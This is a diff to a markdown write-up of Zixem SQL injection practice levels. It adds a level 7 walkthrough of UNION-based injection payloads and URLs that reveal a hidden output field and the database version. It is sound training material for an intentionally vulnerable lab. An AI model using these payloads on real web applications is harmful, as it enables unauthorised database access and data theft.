@@ -233,7 +233,7 @@ Start:
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teacher--`
 > Table 'my_zixem.teacher' doesn't exist
 
-+ Typo?
++ Typo?  
 ***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4 FROM teachers--`  
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teachers--`
 > - Serial number of teacher:  1
@@ -262,6 +262,42 @@ Start:
 > - **Price per 1 leeson:** .....................Congratz
 
 **Bazinga!**  
+###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
+
+## [Level 7](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-7)
+Start:  
+[https://zixem.altervista.org/SQLi/level7.php?id=1](https://zixem.altervista.org/SQLi/level7.php?id=1)  
+> - **Age:** 30
+> - **Cool rating:** 10
+
++ Test with prev Payload:  
+***PAYLOAD***: `1 AND 1=2 UNION SELECT 1,2,3,4--`  
+`https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
+> Nothing new shown, except the *footer* is changed.
+
++ Let's check out the source to see what happened to footer:  
+[view-source:https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3,4--](view-source:https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3,4--)
+> <input type='hidden' name='status' value='***error***' />
+> <b><u><i>Age:</i></u></b> 30<br /><b><u><i>Cool rating:</i></u></b> 10<hr />
+> Level developed by Zixem
+
++ Ok, so the result is hidden, let's check with 3 columns:  
+***PAYLOAD***: `1 AND 1=2 UNION SELECT 1,2,3--`  
+`https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3--`
+> *footer* is reset.
+
+[view-source:https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3--](view-source:https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3--)
+> <input type='hidden' name='status' value='***ok2***'
+
++ Interesting, Let's change value on column 2:  
+***PAYLOAD***: `1 AND 1=2 UNION SELECT 1,version(),3--`  
+##### Result: #####  
+`https://zixem.altervista.org/SQLi/level7.php?id=1%20AND%201=2%20UNION%20SELECT%201,version(),3--`
+> value='ok***5.6.33-log***
+
+**Bazinga!** Do the same with **user()**.  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
 
 ===========================================================================================================  
